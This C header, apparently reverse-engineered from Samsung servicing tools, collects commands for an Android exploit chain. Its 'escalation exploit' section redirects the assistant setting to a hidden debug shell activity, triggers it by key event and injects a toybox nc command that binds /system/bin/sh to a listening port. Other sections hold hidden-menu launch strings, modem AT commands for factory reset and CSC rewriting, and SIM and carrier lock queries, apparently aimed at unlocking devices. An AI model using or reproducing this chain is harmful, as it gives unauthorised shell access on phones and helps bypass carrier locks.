/**
 * @file all_gsm_commands.h
 * @brief Comprehensive dictionary of all extracted GSM, AT, Shell, RIL, and System commands.
 * Auto-extracted and reverse-engineered from Samsung servicing binaries (AT / AT_unpacked).
 */

#ifndef ALL_GSM_COMMANDS_H
#define ALL_GSM_COMMANDS_H

#ifdef __cplusplus
extern "C" {
#endif

/* =========================================================================
 * 1. SHELL & ESCALATION EXPLOIT COMMANDS
 * ========================================================================= */
#define CMD_FLUSH_RADIO_LOGS \
    "logcat -b radio -c > /dev/null 2>&1"

#define CMD_SET_SCREEN_TIMEOUT \
    "settings put system screen_off_timeout 600000 > /dev/null 2>&1"

#define CMD_SET_ASSISTANT_SECURE \
    "settings put Secure assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"

#define CMD_SET_ASSISTANT_SYSTEM \
    "settings put system assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"

#define CMD_SET_DOUBLEPRESS_GLOBAL \
    "settings put global function_key_config_doublepress_value com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"

#define CMD_LAUNCH_SETTINGS \
    "am start -a android.settings.SETTINGS > /dev/null 2>&1"

#define CMD_TRIGGER_ASSIST_KEY \
    "input keyevent 219 > /dev/null 2>&1"

#define CMD_INJECT_NC_ROOT_SHELL \
    "input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'"

#define CMD_KEYEVENT_ENTER \
    "input keyevent 66 > /dev/null 2>&1"

#define CMD_KEYEVENT_TAB \
    "input keyevent 61 > /dev/null 2>&1"

#define CMD_KEYEVENT_HOME \
    "input keyevent 3 > /dev/null 2>&1"

#define CMD_KEYEVENT_MENU \
    "input keyevent 82 > /dev/null 2>&1"

#define CMD_LAUNCH_SAMSUNG_HIDDEN_MENU \
    "am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1"

#define CMD_CHECK_SKT_UNLOCK \
    "pm list packages | grep com.skatd.unlock"

#define CMD_CLEAR_FACTORY_TEST \
    "pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1"

#define CMD_CLEAR_AUDIO_DEBUG \
    "pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1"

#define CMD_DUMP_UI_HIERARCHY \
    "uiautomator dump /sdcard/window_dump.xml > /dev/null 2>&1"

#define CMD_CAT_UI_HIERARCHY \
    "cat /sdcard/window_dump.xml"

#define CMD_CLEAN_UI_DUMP \
    "rm -rf /sdcard/window_dump.xml > /dev/null 2>&1"


/* =========================================================================
 * 2. SAMSUNG AT & MODEM COMMANDS
 * ========================================================================= */
#define AT_CMD_TEST                 "AT\r\n"
#define AT_CMD_PRECONFG_READ        "AT+PRECONFG=1,0\r\n"
#define AT_CMD_PRECONFG_WRITE_FMT   "AT+PRECONFG=2,%s\r\n"
#define AT_CMD_REBOOT_RADIO         "AT+CFUN=1,1\r\n"
#define AT_CMD_MODEM_FACTORY_RESET  "AT+FACTORST=0,0\r\n"
#define AT_CMD_DEVCONINFO           "AT+DEVCONINFO\r\n"
#define AT_CMD_KSTRINGB             "AT+KSTRINGB=0,3\r\n"
#define AT_CMD_IMEI_QUERY           "+IMEITEST:1,\r\n"

/* 3GPP Lock Queries */
#define AT_CMD_SIM_STATUS           "AT+CPIN?\r\n"
#define AT_CMD_QUERY_NETWORK_LOCK   "AT+CLCK=\"PN\",2\r\n"
#define AT_CMD_QUERY_SUBSET_LOCK    "AT+CLCK=\"PU\",2\r\n"
#define AT_CMD_QUERY_SP_LOCK        "AT+CLCK=\"PP\",2\r\n"
#define AT_CMD_QUERY_CORP_LOCK      "AT+CLCK=\"PC\",2\r\n"
#define AT_CMD_QUERY_SIM_LOCK       "AT+CLCK=\"SC\",2\r\n"


/* =========================================================================
 * 3. MODEM CHANNELS AND SOCKET NODES
 * ========================================================================= */
static const char * const ALL_MODEM_CHANNELS[] = {
    /* Samsung RIL Sockets */
    "/dev/socket/rild",
    "/dev/socket/rild-debug",
    "/dev/socket/rild-oem",
    "/dev/socket/rild2",

    /* Samsung Shannon / Exynos IPC nodes */
    "/dev/umts_at0",
    "/dev/umts_atc0",
    "/dev/umts_boot0",
    "/dev/umts_ipc0",
    "/dev/umts_rfs0",

    /* Qualcomm SMD channels */
    "/dev/smd0",
    "/dev/smd7",
    "/dev/smd11",

    /* AT Distributors and Virtual Serial ports */
    "/dev/at_distributor",
    "/dev/at_distributor0",
    "/dev/ttyGS0",
    "/dev/ttyACM0",
    "/dev/ttyUSB0",
    0
};


/* =========================================================================
 * 4. SYSTEM PROPERTIES
 * ========================================================================= */
static const char * const ALL_SYSTEM_PROPERTIES[] = {
    "ro.product.model",
    "ro.product.brand",
    "ro.product.name",
    "ro.product.device",
    "ro.product.manufacturer",
    "ro.serialno",
    "ro.build.version.release",
    "ro.build.version.sdk",
    "ro.build.version.security_patch",
    "ro.build.version.incremental",
    "ro.csc.sales_code",
    "ro.csc.countryiso_code",
    "ro.boot.debug_level",
    "ro.boot.cp_debug_level",
    "gsm.sim.state",
    "gsm.sim.operator.numeric",
    "gsm.operator.numeric",
    "ril.serialnumber",
    "ril.approved_code",
    "ril.product_code",
    "persist.sys.usb.config",
    "sys.usb.config",
    0
};


/* =========================================================================
 * 5. TARGET PACKAGES AND ACTIVITIES
 * ========================================================================= */
#define PKG_AUDIO_DEBUG         "com.sec.android.app.audiocoredebug"
#define ACT_AUDIO_DEBUG_SHELL   "com.sec.android.app.audiocoredebug.AudioAdbShellActivity"
#define PKG_HIDDEN_MENU         "com.sec.hiddenmenu"
#define ACT_IOT_HIDDEN_MENU     "com.sec.hiddenmenu.IOTHiddenMenu"
#define PKG_FACTORY_TEST        "com.samsung.android.FactoryTestLauncher"
#define PKG_RETAIL_MODE         "com.samsung.rms.retailagent.global"
#define PKG_SKT_UNLOCK          "com.skatd.unlock"
#define PKG_FOTA_AGENT          "com.sdet.fotaagent"


/* =========================================================================
 * 6. BRIDGE INTERACTIVE COMMAND PREFIXES
 * ========================================================================= */
#define PROTO_PREFIX_CSC        "CSC:"
#define PROTO_PREFIX_AT         "AT:"
#define PROTO_PREFIX_HEX        "HEX:"
#define PROTO_CMD_SCAN          "SCAN"
#define PROTO_CMD_STATUS        "STATUS"
#define PROTO_CMD_LOCKS         "LOCKS"
#define PROTO_CMD_RECONNECT     "RECONNECT"
#define PROTO_CMD_HELP          "HELP"
#define PROTO_CMD_EXIT          "EXIT"
#define PROTO_CMD_QUIT          "QUIT"

#define TELEMETRY_FORMAT_STRING \
    "INFO|MODEL=%s|CSC=%s|AND=%s|PATCH=%s|DBG=%s|UID=%d|CH=%s\n"

#ifdef __cplusplus
}
#endif

#endif /* ALL_GSM_COMMANDS_H */
